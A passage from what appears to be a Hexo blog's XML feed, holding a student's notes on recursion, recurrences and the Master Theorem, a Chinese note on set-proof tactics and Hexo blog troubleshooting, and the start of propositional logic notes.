takes the same steps), <strong>7 steps</strong></p><p>then take <strong>1 step</strong> to move the biggest disk to the third pillar —- (2)</p><p>then take 7 steps to the third pillar —- (3)</p><p>hence 4 disks take $7+1+7=15$ steps.</p><div class="table-container"><table><thead><tr><th style="text-align:left">disks</th><th style="text-align:left">steps</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">1</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">3</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">7</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">15</td></tr></tbody></table></div><p>Hence the recursion formula is</p><script type="math/tex; mode=display">M(n) ≤ 2M(n−1)+1</script><h1 id="Recursive-Data-Structures"><a href="#Recursive-Data-Structures" class="headerlink" title="Recursive Data Structures"></a>Recursive Data Structures</h1><h2 id="Example-Natural-numbers"><a href="#Example-Natural-numbers" class="headerlink" title="Example: Natural numbers"></a>Example: Natural numbers</h2><p>A natural number is either 0 <strong>(B)</strong> or one more than a natural number <strong>(R)</strong>.</p><p>Formal definition of N:</p><ul><li><strong>(B)</strong> $0 ∈ \mathbb{N}$</li><li><strong>(R)</strong> If $n ∈ \mathbb{N} \quad then (n+1) ∈ \mathbb{N}$</li></ul><h2 id="Example-Odd-Even-numbers"><a href="#Example-Odd-Even-numbers" class="headerlink" title="Example: Odd/Even numbers"></a>Example: Odd/Even numbers</h2><p>The set of <strong>even numbers</strong> can be defined as:</p><ul><li><strong>(B)</strong> 0 is an even number</li><li><strong>(R)</strong> If $n$ is an even number then $n+2$ is an even number</li></ul><p>The set of <strong>odd numbers</strong> can be defined as:</p><ul><li><strong>(B)</strong> 1 is an odd number</li><li><strong>(R)</strong> If $n$ is an odd number then $n+2$ is an odd number</li></ul><h2 id="Example-Fibonacci-numbers"><a href="#Example-Fibonacci-numbers" class="headerlink" title="Example: Fibonacci numbers"></a>Example: Fibonacci numbers</h2><p>The Fibonacci sequence starts 0, 1, 1, 2, 3, … where, after 0, 1, each term is the sum of the previous two terms.</p><p>Formally, the sequence of Fibonacci numbers: $F_0, F_1, F_2, \dots$ where the n-th Fibonacci number $F_n$ is defined as:</p><script type="math/tex; mode=display">(B) F_0 = 0, \\(B) F_1 = 1, \\(R) F_n = F_{n−1} +F_{n−2}</script><p>Take Notice</p><p>Could also define the Fibonacci sequence as a function</p><p>$FIB : \mathbb{N} \to \mathbb{F}.$</p><p>the $\mathbb{F}$ represents the set of Fibonacci numbers. </p><script type="math/tex; mode=display">F=\{ F_0, F_1, F_2, F_3, \dots \} = \{ 0, 1, 1, 2, 3, 5, 8, 13, \dots \}</script><h2 id="Example-Linked-lists"><a href="#Example-Linked-lists" class="headerlink" title="Example: Linked lists"></a>Example: Linked lists</h2><p>A linked list is zero or more linked list nodes:</p><p><img src="/2024/10/24/Math/Recursion/linked_list.png" alt></p><p>We can view the linked list <strong>structure</strong> abstractly. A linked list is either:</p><ul><li><strong>(B)</strong> an empty list, or</li><li><strong>(R)</strong> an ordered pair (Data,List).</li></ul><h2 id="Example-Words-over-Σ"><a href="#Example-Words-over-Σ" class="headerlink" title="Example: Words over $Σ$"></a>Example: Words over $Σ$</h2><p>A word over an alphabet $Σ$ is either $λ(B)$ or a symbol from $Σ$ followed by a word (R).</p><p>Formal definition of $Σ^∗$:</p><ul><li>$(B) λ ∈ Σ^∗$</li><li>$(R) \text{If } w ∈ Σ^∗ \text{then } aw ∈ Σ^∗ \text{ for all } a ∈ Σ$</li></ul><p>Take Notice</p><p>This matches the recursive definition of a <strong>Linked List</strong> data type.</p><h2 id="Example-Expressions-in-the-Proof-Assistant"><a href="#Example-Expressions-in-the-Proof-Assistant" class="headerlink" title="Example: Expressions in the Proof Assistant"></a>Example: Expressions in the Proof Assistant</h2><p>(B) $A,B,…,Z,a,b,…z$ are expressions \<br>(B) $∅$ and $U$ are expressions \<br>(R) If $E$ is an expression then so is $(E)$ and $E^c$ \<br>(R) If $E_1$ and $E_2$ are expressions then:</p><script type="math/tex; mode=display">(E_1 ∪ E_2), \\(E_1 ∩ E_2), \\(E_1 \backslash E_2), and \\(E_1 ⊕ E_2) \text{ are expressions}.</script><h2 id="Example-Propositional-formulas"><a href="#Example-Propositional-formulas" class="headerlink" title="Example: Propositional formulas"></a>Example: Propositional formulas</h2><p>A well-formed formula (wff) over a set of propositional variables, $Prop$ is defined as:</p><p>(B) $⊤$ is a wff</p><p>(B) $⊥$ is a wff</p><p>(B) $p$ is a wff for all $p ∈ Prop$</p><p>(R) If $φ$ is a wff then $¬φ$ is a wff</p><p>(R) If $φ$ and $ψ$ are wffs then:</p><ul><li>$(φ ∧ψ)$,</li><li>$(φ ∨ψ)$,</li><li>$(φ →ψ)$, and</li><li>$(φ ↔ψ)$ are wffs.</li></ul><h2 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h2><p>(a) Give a recursive definition for the sequence</p><script type="math/tex; mode=display">(2, 4, 16, 256, ...)</script><p>To generate $a<em>n = 2^{2^n}$ use $a_n = (a</em>{n−1})^2$.</p><p>(The related “Fermat numbers” $F_n = 2^{2^n} + 1$ are used in cryptography.)</p><p>(b) Give a recursive definition for the sequence</p><script type="math/tex; mode=display">(2, 4, 16, 65536, ...)</script><p>To generate a “stack” of n 2’s use $b<em>n = 2^{b</em>{n−1}}$.</p><h1 id="Recursive-Programming"><a href="#Recursive-Programming" class="headerlink" title="Recursive Programming"></a>Recursive Programming</h1><h2 id="Programming-over-recursive-datatypes"><a href="#Programming-over-recursive-datatypes" class="headerlink" title="Programming over recursive datatypes"></a>Programming over recursive datatypes</h2><p>Recursive datatypes make recursive programming/functions easy.</p><p>The factorial function:</p><script type="math/tex; mode=display">fact(n): \\(B) \quad if(n = 0): 1 \\(R) \quad else: n ∗ fact(n −1)</script><p>Summing the first n natural numbers:</p><script type="math/tex; mode=display">sum(n): \\(B) \quad if(n = 0): 0 \\(R) \quad else: n +sum(n −1)</script><p>Summing elements of a linked list:</p><script type="math/tex; mode=display">sum(L): \\(B) if(L.isEmpty()): return 0 \\(R) else: return L.data+sum(L.next)</script><p>Sorting elements of a linked list (insertion sort):</p><script type="math/tex; mode=display">sort(L):(B) if(L.isEmpty()): \\return L \\else: \\ (R) L2 =sort(L.next) \\insert L.data into L2 \\return L2</script><p>Concatenation of words (defining wv):</p><p>For all $w,v ∈ Σ^∗$ and $a ∈ Σ$ :</p><p>(B) $λv =v$</p><p>(R) $(aw)v = a(wv)$</p><p>Length of words:</p><p>(B) length(λ) = 0</p><p>(R) length(aw) = 1 + length(w)</p><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><p>Let $Σ$ be a finite set.<br>Define append : $Σ^∗ \times Σ \to Σ^∗$ by</p><script type="math/tex; mode=display">append(w, a) = wa</script><p>Give a (direct) definition of append [i.e. only concatenates symbols on the left].</p><p>For all $w ∈ Σ^∗$ and $a,x ∈ Σ$:</p><p>(B) append(λ, x) = x</p><p>(R) append(aw, x) = a append(w, x)</p><h2 id="Pitfall-Correctness-of-Recursive-Definition"><a href="#Pitfall-Correctness-of-Recursive-Definition" class="headerlink" title="Pitfall: Correctness of Recursive Definition"></a>Pitfall: Correctness of Recursive Definition</h2><p>A recurrence formula is correct if the computation of any later term can be reduced to the initial values given in (B).</p><h3 id="Example-Incorrect-definition"><a href="#Example-Incorrect-definition" class="headerlink" title="Example (Incorrect definition)"></a>Example (Incorrect definition)</h3><p>Function g(n) is defined recursively by</p><script type="math/tex; mode=display">g(n) = g(g(n −1)−1)+1, \quad g(0) = 2.</script><p>The definition of $g(n)$ is <strong>incomplete</strong> — the recursion may <strong>not terminate</strong>:</p><p>Attempt to compute $g(1)$ gives</p><script type="math/tex; mode=display">g(1) = g(g(0)−1)+1 = g(1)+1 = ... = g(1)+1+1+1...</script><p>When implemented, it leads to an overflow; most static analyses cannot detect this kind of <strong>ill-defined recursion</strong>.</p><p>However, the definition could be repaired. For example, we can add the specification specify $g(1) = 2$.</p><p>Then </p><script type="math/tex; mode=display">g(2) = g(2−1)+1 = 3, \\g(3) = g(g(2) −1)+1 = g(3−1)+1 = 4, \\\dots</script><h3 id="Example-Incorrect-definition-1"><a href="#Example-Incorrect-definition-1" class="headerlink" title="Example (Incorrect definition)"></a>Example (Incorrect definition)</h3><p>Check your base cases!</p><p>Function f (n) is defined by</p><script type="math/tex; mode=display">f(n) = f(⌈n/2⌉), f(0) = 1</script><p>When evaluated for n = 1 it leads to</p><script type="math/tex; mode=display">f (1) = f(1) = f(1) = ...</script><p>This one can also be repaired. For example, one could specify that<br>$f(1) = 1$.</p><p>This would lead to a constant function $f(n) = 1$ for all $n ≥ 0$.</p><h2 id="Mutual-Recursion"><a href="#Mutual-Recursion" class="headerlink" title="Mutual Recursion"></a>Mutual Recursion</h2><p>Sometimes recursive definitions use more than one function, with each calling each other.</p><h3 id="Example-Fibonacci-again"><a href="#Example-Fibonacci-again" class="headerlink" title="Example (Fibonacci, again)"></a>Example (Fibonacci, again)</h3><p>Recall:</p><script type="math/tex; mode=display">(B) f(0) = 0; \quad f(1) = 1, \\(R) f(n) = f(n −1)+f(n−2)</script><p>Alternative, mutually recursive definition:</p><script type="math/tex; mode=display">(B) f (1) = 1; g(1) = 0 \\(R) f (n) = f(n −1)+g(n−1) \\(R) g(n) = f(n −1)</script><script type="math/tex; mode=display">\left( \begin{matrix}f(n)\\g(n)\end{matrix} \right)=\left( \begin{matrix}1 & 1 \\1 & 0\end{matrix} \right)\left( \begin{matrix}f(n −1) \\g(n −1)\end{matrix} \right)</script><h1 id="Solving-Recurrences"><a href="#Solving-Recurrences" class="headerlink" title="Solving Recurrences"></a>Solving Recurrences</h1><p>Question: How can we (asymptotically) compare recursively defined functions?</p><p>Some practical approaches:</p><ul><li>Unwinding the recurrence</li><li>Approximating with big-O</li><li>The Master Theorem</li></ul><p>Take Notice</p><p>Each approach gives an informal “solution”: ideally one should prove a solution is correct (using e.g. induction).</p><h2 id="Example-1-Unwinding"><a href="#Example-1-Unwinding" class="headerlink" title="Example 1 (Unwinding)"></a>Example 1 (Unwinding)</h2><script type="math/tex; mode=display">f(0) = 1 \\f(n) = 2f(n −1)</script><p>Unwinding:</p><script type="math/tex; mode=display">f(n) = 2f(n−1) \\= 2(2f(n−2)) = 4f(n−2) \\= 4(2f(n−3)) = 8f(n−3) \\\vdots \quad \vdots\\= 2^if(n−i) \\\vdots \quad \vdots\\= 2^nf(0) = 2^n</script><h2 id="Example-2-unwinding"><a href="#Example-2-unwinding" class="headerlink" title="Example 2 (unwinding)"></a>Example 2 (unwinding)</h2><script type="math/tex; mode=display">f(1) = 0 \quad f(n) = 1 + f(\lfloor \frac{n}{2} \rfloor)</script><p>Unwinding:</p><script type="math/tex; mode=display">f(n) = 1+f(n/2) \\= 1+(1+f(n/4)) =2+f(n/4) \\= 2+(1+f(n/8)) \\\vdots \quad \vdots\\= i+f(n/2^i) \\\vdots \quad \vdots\\= log(n)+f(0) = log(n)</script><p>Take notice! The answer above may be wrong, because my proof is here:</p><p><img src="/2024/10/24/Math/Recursion/r_2.png" alt></p><h2 id="Example-3-Approximating-with-big-O"><a href="#Example-3-Approximating-with-big-O" class="headerlink" title="Example 3 (Approximating with big-O)"></a>Example 3 (Approximating with big-O)</h2><script type="math/tex; mode=display">f(1) = 1 \quad f(2) = 1 \quad f(n) =f(n−1)+f(n−2)</script><p>Note, the section is approximate big-O. If you want to unwind the fabonacci sequence, refer to <em>unwind-recursion-formula</em>.</p><p>Assuming $f(n)$ is increasing (The step is only to compare f(n)’s growth, to get its formula until a constant):</p><script type="math/tex; mode=display">f(n −2) ≤ f(n−1)</script><p>so</p><script type="math/tex; mode=display">f(n) ≤ 2f(n −1)</script><p>so (by unwinding):</p><script type="math/tex; mode=display">f(n) ≤ 2^n</script><p>so:</p><script type="math/tex; mode=display">f(n) ∈ O(2^n)</script><h2 id="Master-Theorem"><a href="#Master-Theorem" class="headerlink" title="Master Theorem"></a>Master Theorem</h2><p>The following result covers many recurrences that arise in practice (e.g. divide-and-conquer algorithms)</p><p>Let $a ≥ 1$ be an integer, $b &gt; 1$ a real number, and $T(n)$ be the following recurrence</p><script type="math/tex; mode=display">T(n) = a \cdot T(\frac{n}{b}) + f(n)</script><p>where $f(n) ∈ Θ(n^c(log \text{ }n)^k)$.</p><p>By denoting $d = log_b(a)$, then we have:</p><ul><li><strong>Case 1</strong>: If $c &lt; d$ then $T(n) = Θ(n^d)$</li><li><strong>Case 2</strong>: If $c = d$ then $T(n) = Θ(n^c(logn)^{k+1})$</li><li><strong>Case 3</strong>: If $c &gt; d$ then $T(n) = Θ(f(n))$</li></ul><p>It’s a little complicated to understand, please refer to <a href="https://en.wikipedia.org/wiki/Master_theorem_(analysis_of_algorithms">wiki: Master theorem</a>).</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><script type="math/tex; mode=display">T(n) = T(\frac{n}{2} ) + n^2, \quad T(1)=1</script><p>Here a = 1, b = 2, c = 2, k = 0 and d = 0. So we have Case 3 and the solution is</p><script type="math/tex; mode=display">T(n) = Θ(n^c) = Θ(n^2)</script><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><p>Mergesort has</p><script type="math/tex; mode=display">T(n) = 2T(\frac{n}{2} ) + (n-1)</script><p>for the number of comparisons.</p><p>Here a = b = 2, c = 1, k = 0 and d = 1. So we have Case 2, and the solution is</p><script type="math/tex; mode=display">T(n) = Θ(n^c log(n)) = Θ(nlog(n))</script><h3 id="Example-3-wind"><a href="#Example-3-wind" class="headerlink" title="Example 3 wind"></a>Example 3 wind</h3><p>Unwinding example:</p><script type="math/tex; mode=display">T(1) = 0 \\ T(n) = 1+T(⌊ \frac{n}{2} ⌋)</script><p>Here a = 1, b = 2, c = 0, k = 0, and d = 0. So we have Case 2, and the solution is</p><script type="math/tex; mode=display">T(n) = Θ(log(n))</script><h2 id="The-Master-Theorem-Pitfalls"><a href="#The-Master-Theorem-Pitfalls" class="headerlink" title="The Master Theorem: Pitfalls"></a>The Master Theorem: Pitfalls</h2><p>Take Notice</p><ul><li>a, b, c, k have to be constants (not dependent on n).</li><li>Only one recursive term.</li><li>Recursive term is of the form $T(n/b)$, not $T(n − b)$.</li><li>Solution is only an asymptotic bound.</li></ul><p>Examples</p><p>The Master theorem does not apply to any of these:</p><script type="math/tex; mode=display">T(n) =2^nT(n/2)+n^2 \\T(n) =T(n/5)+T(7n/10)+n \\T(n) =2T(n−1)</script><p>First equation, the a $(2^n)$ is related to n; Second there are two T terms; Third the item is n-1 rather not n/?.</p><h2 id="The-Master-Theorem-Linear-differences"><a href="#The-Master-Theorem-Linear-differences" class="headerlink" title="The Master Theorem: Linear differences"></a>The Master Theorem: Linear differences</h2><p>Take Notice</p><p>The Master Theorem applies to recurrences where T(n) is defined in terms of T(n/b); not in terms of T(n −1).</p><p>However, the following is a consequence of the Master Theorem:</p><p>Theorem</p><p>Suppose</p><script type="math/tex; mode=display">T(n) = a·T(n−1) + bn^k</script><p>Then</p><script type="math/tex; mode=display">T(n)\begin{cases}    O(n^{k+1}) \quad if a=1 \\    O(a^n) \quad if a>1 \end{cases}</script><h3 id="exercise"><a href="#exercise" class="headerlink" title="exercise"></a>exercise</h3><p>Solve $T(n) = 3^nT(\frac{n}{2})$ with $T(1) = 1$</p><p>Let $n ≥ 2$ be a power of 2 then</p><script type="math/tex; mode=display">T(n) = 3^n ·3^{\frac{n}{2}}·3^{\frac{n}{4}}·3^{\frac{n}{8}} \cdot \dots = 3^{1+\frac{1}{2}+\frac{1}{4}+\frac{1}{8}+\dots} = O(3^{2n})</script>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>集合题速做</title>
      <link href="/2024/10/17/Math/%E9%9B%86%E5%90%88%E9%A2%98%E9%80%9F%E5%81%9A/"/>
      <url>/2024/10/17/Math/%E9%9B%86%E5%90%88%E9%A2%98%E9%80%9F%E5%81%9A/</url>
      
        <content type="html"><![CDATA[<p>比如，A∩B不等于空集，直接推出<strong>A和B都不是空集</strong>，因此<strong>再假设 存在x属于A 属于B</strong>这种的</p><p>如果是<strong>超集，那这个集合肯定不是空集</strong></p><p>如果有<strong>子集，那可能是空集</strong>，可以直接let这个集合是$\empty$</p><p>这样<strong>如果题是对的</strong>，直接正向证明；<strong>如果是反例</strong>，就直接Counter example</p><p>看题目：</p><p><img src="/2024/10/17/Math/%E9%9B%86%E5%90%88%E9%A2%98%E9%80%9F%E5%81%9A/S_Q.png" alt></p><p>比如我下面第一个图的解法不严谨：得先证明集合都不是空集，才能假设有元素x。</p><p><img src="/2024/10/17/Math/%E9%9B%86%E5%90%88%E9%A2%98%E9%80%9F%E5%81%9A/S11.jpg" alt></p><p>下图解法严谨正确。</p><p><img src="/2024/10/17/Math/%E9%9B%86%E5%90%88%E9%A2%98%E9%80%9F%E5%81%9A/S12.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3-hexo error solution</title>
      <link href="/2024/10/16/trivia/3-hexo-error-solution/"/>
      <url>/2024/10/16/trivia/3-hexo-error-solution/</url>
      
        <content type="html"><![CDATA[<p>3-hexo博客系统最近老是出问题，我阐述下博客如何备份、常见问题解决。</p><h1 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h1><p>hexo只负责生成前端页面，然后<code>hexo d</code>命令直接推到你的github 仓库然后部署到 git page上，因此需要注意hexo d命令并不会把你的md的博客源文件备份。你如果不小心删除了自己的md源文件，必须自己想办法抄自己git page抄回来才行。</p><p>如果要备份，参考下3-hexo原作者文章，已经直接提到了建议自行 git init 对博客源文件进行备份。</p><p><a href="https://yelog.org/2017/03/23/3-hexo-instruction/">https://yelog.org/2017/03/23/3-hexo-instruction/</a></p><p>参考 <strong>6.3 博客备份（快捷命令升级版）</strong> 一章。</p><p>另外记得把<code>\themes\3-hexo</code>目录下的<code>.git</code>目录直接删除。</p><p>因为你已经配置了一些东西在这个目录下的<code>.config.yml</code>，所以不要把这个东西当submodule或者什么不值得上传的目录。因为我们配置很麻烦，干脆备份直接把配置文件、图片、博客md全都上传到github，这样最方便和彻底。</p><h1 id="常见问题-childProcess"><a href="#常见问题-childProcess" class="headerlink" title="常见问题 childProcess"></a>常见问题 childProcess</h1><p>常见于hexo自己处理的<code>.deploy_git</code>的一些git index出现了错误，或者npm的库文件出什么幺蛾子。</p><p>这个问题解决办法（90%的办法）：</p><p>直接删除 <code>node_modules</code> 目录，然后 <code>npm i</code> 命令重新下载这个 <code>node_modules</code></p><p>然后删除<code>.deploy_git</code>，自己用<code>hexo d</code>重新生成。</p><p>最后记得把<code>.deploy_git</code>加入<code>.gitignore</code>。</p><pre><code>.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/_multiconfig.yml.deploy_git</code></pre>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Propositional Logic</title>
      <link href="/2024/10/15/Math/Propositional-Logic/"/>
      <url>/2024/10/15/Math/Propositional-Logic/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#propositional-logic-informally">Propositional Logic, informally</a><ul><li><a href="#examples">Examples</a></li><li><a href="#logical-connectives">Logical connectives</a><ul><li><a href="#examples-1">Examples</a></li></ul></li><li><a href="#logical-connectives-1">Logical connectives</a></li><li><a href="#compound-propositions">Compound propositions</a><ul><li><a href="#example">example</a></li></ul></li><li><a href="#vacuous-truth">Vacuous truth</a><ul><li><a href="#exercises">Exercises</a></li></ul></li><li><a href="#tautologies-contradictions-and-contingencies">Tautologies, Contradictions and Contingencies</a><ul><li><a href="#definition">Definition</a></li><li><a href="#example-1">Example</a></li></ul></li><li><a href="#applications-i-constraint-satisfaction-problems">Applications I: Constraint Satisfaction Problems</a><ul><li><a href="#example-2">Example</a></li><li><a href="#exercise">Exercise</a></li></ul></li><li><a href="#logical-equivalence">Logical equivalence</a></li><li><a href="#applications-ii-program-logic">Applications II: Program Logic</a></li><li><a href="#entailment-and-validity">Entailment and Validity</a><ul><li><a href="#example-of-toyota-and-ford">Example of Toyota and Ford</a></li><li><a href="#example-of-spaceship-and-the-imposters">Example of spaceship and the imposters</a></li></ul></li><li><a href="#applications-iii-reasoning-about-requirementsspecifications">Applications III: Reasoning About Requirements/Specifications</a><ul><li><a href="#example-of-alarm-ringing">Example of alarm ringing</a></li></ul></li></ul></li><li><a href="#propositional-logic-formally">Propositional Logic, formally</a><ul><li><a href="#syntax-vs-semantics">Syntax vs Semantics</a><ul><li><a href="#example-3">example</a></li></ul></li><li><a href="#syntax-well-formed-formulas">Syntax: Well-formed formulas</a><ul><li><a href="#examples-2">Examples</a></li></ul></li><li><a href="#syntax-conventions">Syntax: Conventions</a></li><li><a href="#syntax-parse-trees">Syntax: Parse trees</a></li><li><a href="#syntax-parse-trees-formally">Syntax: Parse trees formally</a></li><li><a href="#semantics-boolean-algebras">Semantics: Boolean Algebras</a></li><li><a href="#semantics-truth-valuations">Semantics: Truth valuations</a></li><li><a href="#semantics-exercises">Semantics: Exercises</a></li><li><a href="#semantics-truth-tables">Semantics: Truth tables</a></li><li><a href="#satisfiability-and-equivalence">Satisfiability and Equivalence</a></li><li><a href="#example-party-invitations">Example: Party invitations</a></li><li><a href="#logical-equivalence-1">Logical equivalence</a><ul><li><a href="#properties">properties</a></li><li><a href="#exercise-1">exercise</a></li></ul></li><li><a href="#theories-and-entailment">Theories and entailment</a></li><li><a href="#entailment-and-implication">Entailment and Implication</a></li><li><a href="#showing-entailment">Showing entailment</a><ul><li><a href="#entailment-example">Entailment example</a></li><li><a href="#examplecrewmates-and-imposters">Example:Crewmates and Imposters</a></li></ul></li></ul></li><li><a href="#cnf-and-dnf-revisited">CNF and DNF Revisited</a></li><li><a href="#beyond-propositional-logic">Beyond Propositional Logic</a><ul><li><a href="#limitations-to-propositional-logic">Limitations to Propositional Logic</a></li><li><a href="#beyond-propositional-logic-1">Beyond Propositional Logic</a></li><li><a href="#limitations">Limitations</a></li></ul></li></ul><h1 id="Propositional-Logic-informally"><a href="#Propositional-Logic-informally" class="headerlink" title="Propositional Logic, informally"></a>Propositional Logic, informally</h1><p>A <strong>proposition</strong> (or sentence) is a declarative statement; something that is either <strong>true</strong> or <strong>false</strong>.</p><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><ul><li>Richard Nixon was president of Ecuador.</li><li>A square root of 16 is 4.</li><li>Euclid’s program gets stuck in an infinite loop if you input 0.</li><li>$x^n +y^n =z^n$ has no nontrivial integer solutions for n &gt; 2.</li><li>3 divides 24.</li><li>K_5 is planar.</li></ul><p>The following are <strong>not</strong> declarative sentences:</p><ul><li>Gubble gimble goo</li><li>For Pete’s sake, take out the garbage!</li><li>Did you watch MediaWatch last week?</li><li>Please waive the prerequisites for this subject for me.</li><li>x divides y.  — R(x,y)</li><li>x =3 and x divides 24.  — P(x)</li></ul><h2 id="Logical-connectives"><a href="#Logical-connectives" class="headerlink" title="Logical connectives"></a>Logical connectives</h2><p><strong>Logical connectives</strong> join together propositions to build larger, <strong>compound</strong> propositions.</p><h3 id="Examples-1"><a href="#Examples-1" class="headerlink" title="Examples"></a>Examples</h3><ul><li>Chef is a bit of a Romeo <strong>and</strong> Kenny is always getting killed.</li><li>Either Bill is a liar <strong>or</strong> Hillary is innocent of Whitewater.</li><li>It is <strong>not</strong> the case that this program always halts.</li><li><strong>If</strong> it is raining <strong>then</strong> I have an umbrella.</li></ul><h2 id="Logical-connectives-1"><a href="#Logical-connectives-1" class="headerlink" title="Logical connectives"></a>Logical connectives</h2><p>Common logical connectives:</p><div class="table-container"><table><thead><tr><th>Symbol</th><th>Default</th><th>Also known as</th></tr></thead><tbody><tr><td>∧</td><td>and</td><td>but,“;”</td></tr><tr><td>∨</td><td>or</td><td>“either .. or ..”</td></tr><tr><td>¬</td><td>not</td><td>not the case</td></tr><tr><td>→</td><td>“if .. then..”</td><td><strong>implies</strong>, whenever, is sufficient for</td></tr><tr><td>↔</td><td>“.. ifandonlyif ..”</td><td><strong>bi-implies</strong>, necessary and sufficient, exactly when, just in case</td></tr></tbody></table></div><h2 id="Compound-propositions"><a href="#Compound-propositions" class="headerlink" title="Compound propositions"></a>Compound propositions</h2><p>The <strong>truth</strong> of a compound proposition depends on the truth of its components (<strong>atomic propositions</strong>):</p><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>P: Chef is a bit of a Romeo <strong>and</strong> Kenny is always getting killed.</p><div class="table-container"><table><thead><tr><th>Chef is a bit of a Romeo</th><th>Kenny is always getting killed</th><th>P</th></tr></thead><tbody><tr><td>True</td><td>True</td><td>True</td></tr><tr><td>False</td><td>True</td><td>False</td></tr><tr><td>True</td><td>False</td><td>False</td></tr><tr><td>False</td><td>False</td><td>False</td></tr></tbody></table></div><hr><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-09-55-00.png" alt></p><h2 id="Vacuous-truth"><a href="#Vacuous-truth" class="headerlink" title="Vacuous truth"></a>Vacuous truth</h2><p>Interesting! I thought the topic in my former article <a href="https://senranja.github.io/2024/09/27/Math/vacuous-truth/">由空集和子集，想到空洞真理</a>.</p><p>How to interpret A → B when A is false?</p><p>A→B If A(premise) then B (conclusion)</p><p>Material implication is false <strong>only when</strong> the premise holds and the conclusion does not.</p><p>If the premise is false, the implication is true no matter how absurd the conclusion is.</p><p>Both the following statements are true:</p><ul><li>If February has 30 days then March has 31 days.</li><li>If February has 30 days then March has 42 days.</li></ul><h3 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h3><p>p = “youget an HD on your final exam”</p><p>q = “youdoevery exercise in the book”</p><p>r = “you get an HD in the course”</p><p>Translate into logical notation:</p><p>(a) You get an HD in the course although you do not do every exercise in the book.</p><p>r∧¬q</p><p>(c) To get an HD in the course, you must get an HD on the exam.</p><p>r→p</p><p>(d) Youget an HDonyour exam, but you don’t do every exercise in this book; nevertheless, you get an HD in this course.</p><p>p∧¬q∧r</p><h2 id="Tautologies-Contradictions-and-Contingencies"><a href="#Tautologies-Contradictions-and-Contingencies" class="headerlink" title="Tautologies, Contradictions and Contingencies"></a>Tautologies, Contradictions and Contingencies</h2><p>同义反复、矛盾和偶然性</p><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><p>A proposition is:</p><ul><li>a tautology if it is always true,</li><li>a contradiction if it is always false,</li><li>a contingency if it is neither a tautology or a contradiction,</li><li>satisfiable if it is not a contradiction.</li></ul><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><ul><li>Contingency: It is raining</li><li>Tautology: It is raining or it is not raining</li><li>Contradiction: It is raining and it is not raining</li></ul><h2 id="Applications-I-Constraint-Satisfaction-Problems"><a href="#Applications-I-Constraint-Satisfaction-Problems" class="headerlink" title="Applications I: Constraint Satisfaction Problems"></a>Applications I: Constraint Satisfaction Problems</h2><p>These are problems such as timetabling, activity planning, etc.</p><p>Many can be understood as showing that a formula is satisfiable.</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p>You are planning a party, but your friends are a bit touchy about who will be there.</p><ol><li><p>Sarah hates John’s jokes. She will not come to the party if John is invited.</p></li><li><p>Kim loves John’s jokes, and says she will not come unless John does.</p></li><li><p>Sarah is shy, and will only come to the party if her best friend Kim will be there.</p></li></ol><p>Who can you invite without making someone unhappy?</p><p>Translation to logic: let J,S,K represent “John (Sarah, Kim) comes to the party”. Then the constraints are:</p><ol><li>J →¬S</li><li>K →J</li><li>S →K</li></ol><p>Thus, for a successful party to be possible, we want the formula $φ =(J →¬S)∧(S →K)∧(K →J)$ to be satisfiable. Truth values for J,S,K making this true are called <strong>satisfying</strong> <strong>assignments</strong>, or <strong>models</strong>.</p><p>We can use logical reasoning to work out what options are available:</p><ul><li><p>If Kim comes, then John must, and Sarah must not.</p></li><li><p>If Kim doesn’t come, then Sarah cannot come. John may or may not come.</p></li></ul><p>Conclusion: a party satisfying the constraints can be held. Invite nobody, or invite John only, or invite Kim and John.</p><h3 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h3><p><img src="/2024/10/15/Math/Propositional-Logic/JT1.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-16-12-59-07.png" alt></p><h2 id="Logical-equivalence"><a href="#Logical-equivalence" class="headerlink" title="Logical equivalence"></a>Logical equivalence</h2><p>Definition</p><p>Two propositions are <strong>logically equivalent</strong> if they are true for the same truth values of their atomic propositions.</p><p>Example</p><p>A : “It is raining”</p><p>is logically equivalent to</p><p>¬(¬A) : “It is not the case that it is not raining”</p><div class="table-container"><table><thead><tr><th>A</th><th>¬A</th><th>¬(¬A)</th></tr></thead><tbody><tr><td>True</td><td>False</td><td>True</td></tr><tr><td>False</td><td>True</td><td>False</td></tr></tbody></table></div><h2 id="Applications-II-Program-Logic"><a href="#Applications-II-Program-Logic" class="headerlink" title="Applications II: Program Logic"></a>Applications II: Program Logic</h2><p>Example</p><p>if $x &gt;0$ or $(x &lt;=0 and y &gt;100)$:</p><script type="math/tex; mode=display">Let \quad p \overset{def}{=} ( x >0) \quad and \quad q \overset{def}{=} (y > 100)</script><script type="math/tex; mode=display">p ∨ (¬p∧q)</script><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-10-36-58.png" alt></p><p>$p ∨(¬p ∧q)$ is equivalent to $p ∨q$.</p><p>Hence the code can be simplified to</p><script type="math/tex; mode=display">if x >0 \quad or \quad y >100:</script><h2 id="Entailment-and-Validity"><a 